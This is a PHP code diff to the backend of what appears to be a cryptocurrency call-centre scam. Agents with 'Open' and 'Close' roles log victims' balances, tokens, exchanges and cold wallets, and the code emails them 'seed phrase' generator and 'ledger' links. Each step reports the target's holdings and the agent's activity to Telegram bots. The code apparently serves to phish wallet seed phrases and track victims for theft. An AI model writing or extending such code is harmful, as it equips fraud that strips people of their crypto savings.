@@ -5,17 +5,28 @@ header('Content-Type: application/json');
 date_default_timezone_set('Europe/London');
 
 require __DIR__ . '/vendor/autoload.php';
+
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
 require_once 'config/db_config.php';
 require_once 'GoogleSheetsHelper.php';
 require_once 'EmailHelper.php';
+require_once 'functions.php';
 
 $action    = isset($_POST['action'])    ? trim($_POST['action'])    : '';
 $reference = isset($_POST['reference']) ? trim($_POST['reference']) : '';
 $agent     = isset($_POST['agent'])     ? trim($_POST['agent'])     : '';
 $caller    = isset($_POST['caller'])    ? trim($_POST['caller'])    : '';
+$department = isset($_POST['department'])    ? trim($_POST['department'])    : '';
+
+// user info data
+$balance = isset($_POST['balance']) ? trim($_POST['balance']) : '';
+$lastLogin = isset($_POST['last_login']) ? trim($_POST['last_login']) : '';
+$notes = isset($_POST['notes']) ? trim($_POST['notes']) : '';
+$token = isset($_POST['tokens']) ? trim($_POST['tokens']) : '';
+$exchanges = isset($_POST['exchanges']) ? trim($_POST['exchanges']) : '';
+$cold_wallets = isset($_POST['cold_wallets']) ? trim($_POST['cold_wallets']) : '';
 
 $todaydate = date('Y-m-d H:i:s');
 
@@ -52,6 +63,9 @@ try {
         case 'block':
             $response = handleBlockAction($reference);
             break;
+        case 'save_user_info':
+            $response = handleUserInfoAction($reference);
+            break;
 
         default:
             $response = ['success' => false, 'error' => 'Invalid action'];
@@ -66,6 +80,7 @@ echo json_encode($response);
 
 function handleVerifyAction($reference)
 {
+    global $agent, $department;
     // Search for reference in Google Sheets
     $sheet = new GoogleSheetsHelper();
     $referenceData = $sheet->searchInSheet('Reference', $reference);
@@ -86,6 +101,16 @@ function handleVerifyAction($reference)
     $emailHelper = new EmailHelper();
     $emailHelper->sendVerificationEmail($email, $verificationCode);
 
+    $jsonData = [
+        'Activity' => 'Lead verified',
+        'Department' => $department ?? 'Unknown',
+        'Agent' => $agent . ' (Open)',
+    ];
+
+    sendDataToTelegramBot($jsonData);
+
+    storeReferenceTracking($reference, $department, $agent);
+
     logAction($reference);
 
     return [
@@ -98,6 +123,7 @@ function handleVerifyAction($reference)
 
 function handleApiKeyAction($reference)
 {
+    global $agent, $department, $balance;
 
     $sheet = new GoogleSheetsHelper();
     $referenceData = $sheet->searchInSheet('Reference', $reference);
@@ -122,6 +148,15 @@ function handleApiKeyAction($reference)
     $emailHelper = new EmailHelper();
     $emailHelper->sendApiKeyNotification($email, $supportPhone);
 
+    $jsonData = [
+        'Activity' => 'API Key attached',
+        'Department' => $department ?? 'Unknown',
+        'Agent' => $agent . ' (Open)',
+        'Balance' => $balance
+    ];
+
+    sendDataToTelegramBot($jsonData);
+
     logAction($reference);
 
     return [
@@ -133,6 +168,7 @@ function handleApiKeyAction($reference)
 
 function handleApiCancelAction($reference)
 {
+    global $agent, $department, $balance;
 
     $sheet = new GoogleSheetsHelper();
     $referenceData = $sheet->searchInSheet('Reference', $reference);
@@ -150,6 +186,23 @@ function handleApiCancelAction($reference)
     $emailHelper = new EmailHelper();
     $emailHelper->sendApiKeyCancellation($email);
 
+    $user = getAllAusers($agent);
+
+    if (isset($user[0]) && empty($user[0])) {
+        return ['success' => false, 'error' => 'User not found for reference ' . $reference];
+    }
+
+    $role = $user[0]['role'] ?? 'Unknown';
+
+    $jsonData = [
+        'Activity' => 'API Key access revoked',
+        'Department' => $department ?? 'Unknown',
+        'Agent' => $agent . ' (' . $role . ')',
+        'Balance' => $balance
+    ];
+
+    sendDataToTelegramBot($jsonData);
+
     logAction($reference);
 
     return [
@@ -160,6 +213,8 @@ function handleApiCancelAction($reference)
 
 function handleSeedPhraseAction($reference)
 {
+    global $agent, $department, $balance;
+
     $seedUrl = "seed.com/" . strtolower($reference);
 
     $sheet = new GoogleSheetsHelper();
@@ -178,6 +233,15 @@ function handleSeedPhraseAction($reference)
     $emailHelper = new EmailHelper();
     $emailHelper->sendSeedPhraseEmail($email, $seedUrl);
 
+    $jsonData = [
+        'Activity' => 'Generator link sent',
+        'Department' => $department ?? 'Unknown',
+        'Agent' => $agent . ' (Close)',
+        'Balance' => $balance
+    ];
+
+    sendDataToTelegramBot($jsonData);
+
     logAction($reference);
 
     return [
@@ -189,6 +253,8 @@ function handleSeedPhraseAction($reference)
 
 function handleLedgerAction($reference)
 {
+    global $agent, $department, $balance;
+
     $ledgerUrl = "ledger.com";
 
     $sheet = new GoogleSheetsHelper();
@@ -206,6 +272,24 @@ function handleLedgerAction($reference)
 
     $emailHelper = new EmailHelper();
     $emailHelper->sendLedgerEmail($email, $ledgerUrl);
+
+    $user = getAllAusers($agent);
+
+    if (isset($user[0]) && empty($user[0])) {
+        return ['success' => false, 'error' => 'User not found for reference ' . $reference];
+    }
+
+    $role = $user[0]['role'] ?? 'Unknown';
+
+    $jsonData = [
+        'Activity' => 'Ledger link sent',
+        'Department' => $department ?? 'Unknown',
+        'Agent' => $agent . ' (' . $role . ')',
+        'Balance' => $balance
+    ];
+
+    sendDataToTelegramBot($jsonData, TELEGRAM_ADMIN_BOT_URL);
+
     logAction($reference);
 
     return [
@@ -237,12 +321,14 @@ function sendAlert()
 
     if (in_array($action, ['api_key', 'api_key_cancel', 'seed_phrase', 'ledger'], true)) {
 
-        $action = str_replace('_', ' ', $action); 
-        $action = ucwords($action); 
+        $action = str_replace('_', ' ', $action);
+        $action = ucwords($action);
 
         $subject = "ALERT: {$action} clicked by {$agent}";
         $body = "Button  : {$action}\nAgent   : {$agent}\nReference  : {$caller}\nTime    : " . date('H:i:s d-m-Y');
+
         file_put_contents(date('Y-m-d') . "_emailphrase.txt", $body . PHP_EOL, FILE_APPEND);
+
         $emails = [];
         define('ALERT_FROM', 'santi@allsmartone.com');
 
@@ -328,6 +414,55 @@ function generateVerificationCode()
     return rand(100, 999) . '-' . rand(100, 999);
 }
 
+function handleUserInfoAction($reference)
+{
+    global $agent, $department, $balance, $lastLogin, $notes, $token, $exchanges, $cold_wallets;
+
+    $sheet = new GoogleSheetsHelper();
+    $referenceData = $sheet->searchInSheet('Reference', $reference);
+
+    if (empty($referenceData)) {
+        return ['success' => false, 'error' => 'Reference not found'];
+    }
+
+    if (!isset($referenceData[0]['Email']) || empty($referenceData[0]['Email'])) {
+        return ['success' => false, 'error' => 'Email not found for reference ' . $reference];
+    } else {
+        $email = $referenceData[0]['Email'];
+    }
+    
+    // Store user info data in the database
+    $userData = [
+        'last_login' => $lastLogin,
+        'balance' => $balance,
+        'tokens' => $token,
+        'exchanges' => $exchanges,
+        'cold_wallets' => $cold_wallets,
+        'notes' => $notes
+    ];
+    
+    $storeResult = storeUserInfo($reference, $userData);
+    
+    $jsonData = [
+        'Activity' => 'Qualification',
+        'Department' => $department ?? 'Unknown',
+        'Agent' => $agent . ' (Close)',
+        'Balance' => $balance,
+        'Tokens' => $token,
+        'Exchanges' => $exchanges,
+        'Cold Wallets' => $cold_wallets,
+        'Last Login' => $lastLogin,
+        'Notes' => $notes
+    ];
+
+    sendDataToTelegramBot($jsonData);
+
+    return [
+        'success' => true,
+        'message' => 'User info saved successfully'
+    ];
+}
+
 function sendEmail(array $emails, string $subject, string $body)
 {
     $mail = new PHPMailer(true);
@@ -352,9 +487,7 @@ function sendEmail(array $emails, string $subject, string $body)
         $mail->Body    = $body;
 
         $mail->send();
-
     } catch (Exception $e) {
         $errorMsg = "[" . date('Y-m-d H:i:s') . "] Email failed: " . $mail->ErrorInfo . "\n";
     }
 }
-
